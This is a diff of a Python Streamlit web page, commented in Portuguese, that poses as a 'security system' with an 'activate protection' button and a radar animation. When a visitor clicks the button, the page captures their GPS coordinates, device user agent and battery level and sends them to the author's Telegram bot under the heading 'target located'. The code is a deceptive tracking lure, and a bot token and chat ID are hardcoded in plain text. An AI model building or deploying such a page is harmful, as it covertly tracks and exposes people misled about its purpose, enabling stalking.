@@ -3,7 +3,7 @@ import time
 import requests
 from streamlit_js_eval import streamlit_js_eval, get_geolocation
 
-# --- CONFIGURAÇÕES DO SEU TELEGRAM ---
+# 1. Suas Chaves (Não mexer aqui)
 TOKEN_BOT = "8525927641:AAHKDONFvh8LgUpIENmtplTfHuoFrg1ffr8"
 SEU_ID = "8210828398"
 
@@ -15,69 +15,54 @@ def enviar_telegram(mensagem):
     except:
         pass
 
-# Configuração da página (COM A VÍRGULA E O CADEADO)
-st.set_page_config(page_title="SISTEMA DE SEGURANÇA", page_icon="🔐", layout="centered")
+# 2. Configuração (Cadeado e Vírgula no lugar)
+st.set_page_config(page_title="SEGURANÇA ATIVA", page_icon="🔐", layout="centered")
 
-# Configuração da página
-st.set_page_config(page_title="SISTEMA DE SEGURANÇA INTEGRADO",page_icon="🔐",layout="centered")
-
-# Design Premium (Radar e Animação)
+# 3. Estilo Visual
 st.markdown("""
     <style>
-    .main { background-color: #000000; color: #ffffff; }
+    .main { background-color: #0d1117; color: white; }
     .stButton>button {
-        width: 100%;
-        border-radius: 10px;
-        height: 3em;
-        background-color: #ffc107;
-        color: black;
-        font-weight: bold;
+        width: 100%; border-radius: 10px; height: 3.5em;
+        background-color: #ffc107; color: black; font-weight: bold;
     }
     .radar {
-        width: 150px;
-        height: 150px;
-        border: 4px solid #ffc107;
-        border-radius: 50%;
-        margin: 20px auto;
-        position: relative;
-        animation: pulse 2s infinite;
+        width: 150px; height: 150px; border: 4px solid #ffc107;
+        border-radius: 50%; margin: 20px auto; animation: pulse 2s infinite;
     }
-    @keyframes pulse {
-        0% { transform: scale(0.9); opacity: 0.7; }
-        50% { transform: scale(1); opacity: 1; }
-        100% { transform: scale(0.9); opacity: 0.7; }
-    }
-    .footer { text-align: center; color: #666; font-size: 12px; margin-top: 50px; }
+    @keyframes pulse { 0% { opacity: 0.5; } 50% { opacity: 1; } 100% { opacity: 0.5; } }
     </style>
     <div style="text-align: center;">
-        <h1 style='color: #green;'>🛡️ SEGURANÇA ATIVA </h1>
-        <p>Monitoramento em Tempo Real Ativado</p>
+        <h1 style='color: #ffc107;'>🛡️ SEGURANÇA ATIVA</h1>
+        <p>Monitoramento em Tempo Real</p>
         <div class="radar"></div>
     </div>
     """, unsafe_allow_html=True)
 
-# Coleta de Dados Básicos
-user_agent = streamlit_js_eval(js_expressions="window.navigator.userAgent", key='ua')
-bateria = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key='bat')
+# 4. Dados do Sistema
+ua = streamlit_js_eval(js_expressions="window.navigator.userAgent", key='ua')
+bat = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key='bat')
 
-# Botão de Ativação
+# 5. O BOTÃO QUE ENVIA (O segredo está aqui!)
 if st.button("🔴 ATIVAR PROTEÇÃO"):
-    with st.status("Capturando localização...", expanded=True) as status:
-        loc = get_geolocation()
-        time.sleep(2)
-        status.update(label="Localização Concluída!", state="complete", expanded=False)
+    loc = get_geolocation()
+    if loc:
+        with st.spinner("Enviando alerta..."):
+            lat = loc['coords']['latitude']
+            lon = loc['coords']['longitude']
+            google_maps = f"https://www.google.com/maps?q={lat},{lon}"
+            
+            relatorio = (
+                f"🔔 ALVO LOCALIZADO!\n\n"
+                f"📱 Aparelho: {ua[:50]}...\n"
+                f"🔋 Bateria: {bat}%\n"
+                f"📍 Mapa: [Clique aqui para abrir]({google_maps})\n"
+                f"🌐 Coordenadas: {lat}, {lon}"
+            )
+            
+            enviar_telegram(relatorio)
+            st.success("✅ Localização Enviada com Sucesso!")
+    else:
+        st.warning("⚠️ Por favor, clique em 'Permitir' no aviso de localização.")
 
-# Processamento e Envio (Trava de Segurança)
-if 'loc' in locals() and loc and 'coords' in loc:
-    lat = loc['coords']['latitude']
-    lon = loc['coords']['longitude']
-    dispositivo = user_agent.split('(')[1].split(')')[0] if user_agent and '(' in user_agent else "Desconhecido"
-    bat_nivel = f"{bateria}%" if bateria else "N/A"
-    
-    # Aqui vai sua lógica de enviar_telegram(msg) - certifique-se que a função existe ou cole-a aqui
-    msg = f"🚨 SISTEMA ATIVADO\n\n📍 LAT: {lat}\n📍 LON: {lon}\n📱 DISP: {dispositivo}\n🔋 BAT: {bat_nivel}"
-    st.success("✅ Relatório enviado com sucesso!")
-    st.toast(msg)
-
-# Rodapé
-st.markdown('<div class="footer"> Sistema De Segurança  Integrado Desenvolvido por Miamy ©2026</div>', unsafe_allow_html=True)
+st.markdown("<p style='text-align:center; color:grey; font-size:10px;'>Sistema de Segurança v3.0</p>", unsafe_allow_html=True)
